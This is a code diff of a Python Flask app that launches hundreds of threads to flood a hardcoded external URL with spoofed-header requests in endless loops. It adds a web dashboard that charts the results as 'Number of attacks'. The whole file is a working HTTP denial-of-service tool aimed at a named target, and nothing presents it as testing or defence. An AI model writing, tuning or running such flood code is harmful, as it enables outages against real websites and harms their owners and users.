@@ -1,11 +1,11 @@
-from flask import Flask, jsonify
+from flask import Flask, jsonify, render_template_string
 import requests
 import threading
-from bs4 import BeautifulSoup
 from fake_useragent import UserAgent
 import urllib3
 import time
 import random
+
 app = Flask(__name__)
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 ua = UserAgent()
@@ -17,6 +17,7 @@ headers_referers = [
 ]
 stats = {"good": {}, "failed": 0}
 lock = threading.Lock()
+
 def chek(url):
     while True:
         try:
@@ -36,16 +37,71 @@ def chek(url):
         except requests.exceptions.RequestException:
             with lock:
                 stats["failed"] += 1
+
 def start_threads():
     target_url = "https://adminpanel.in.net/chito/"
-    for _ in range(1200):
+    for _ in range(300):
         thread = threading.Thread(target=chek, args=(target_url,))
         thread.daemon = True
         thread.start()
+
+html_template = """
+<!DOCTYPE html>
+<html lang=\"ar\">
+<head>
+    <meta charset=\"UTF-8\">
+    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
+    <title>dashboard</title>
+    <script src=\"https://cdn.jsdelivr.net/npm/chart.js\"></script>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; direction: rtl; }
+        canvas { max-width: 600px; margin: 20px auto; }
+    </style>
+</head>
+<body>
+    <h1>dashboard</h1>
+    <canvas id=\"statsChart\"></canvas>
+    <script>
+        async function fetchData() {
+            const response = await fetch('/api/stats');
+            const data = await response.json();
+            updateChart(data);
+        }
+        function updateChart(data) {
+            const ctx = document.getElementById('statsChart').getContext('2d');
+            const statusCodes = Object.keys(data.good).map(code => `HTTP ${code}`);
+            const values = Object.values(data.good);
+            const failedRequests = data.failed;
+            
+            if (window.myChart) window.myChart.destroy();
+            window.myChart = new Chart(ctx, {
+                type: 'bar',
+                data: {
+                    labels: [...statusCodes, 'Failed '],
+                    datasets: [{
+                        label: 'Number of attacks ',
+                        data: [...values, failedRequests],
+                        backgroundColor: ['green', 'red']
+                    }]
+                }
+            });
+        }
+        fetchData();
+        setInterval(fetchData, 5000);
+    </script>
+</body>
+</html>
+"""
+
 @app.route('/')
 def home():
+    return render_template_string(html_template)
+
+@app.route('/api/stats')
+def api_stats():
     with lock:
         return jsonify(stats)
+
 if __name__ == '__main__':
     threading.Thread(target=start_threads, daemon=True).start()
     app.run(host='0.0.0.0', port=5000)
